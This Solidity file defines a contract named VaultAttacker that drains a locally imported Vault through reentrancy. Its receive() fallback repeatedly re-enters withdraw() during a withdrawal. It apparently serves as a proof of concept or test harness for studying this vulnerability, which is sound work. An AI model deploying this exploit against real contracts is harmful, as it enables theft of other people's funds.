// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "./Vault.sol";

contract VaultAttacker {
    Vault public immutable vault;
    uint256 public attackAmount;
    bool private attacking;

    constructor(address vaultAddress) {
        vault = Vault(vaultAddress);
    }

    function attack() external payable {
        require(msg.value > 0, "value=0");
        attackAmount = msg.value;
        vault.deposit{value: msg.value}();
        attacking = true;
        vault.withdraw(msg.value);
        attacking = false;
    }

    receive() external payable {
        if (attacking && address(vault).balance >= attackAmount) {
            vault.withdraw(attackAmount);
        }
    }
}
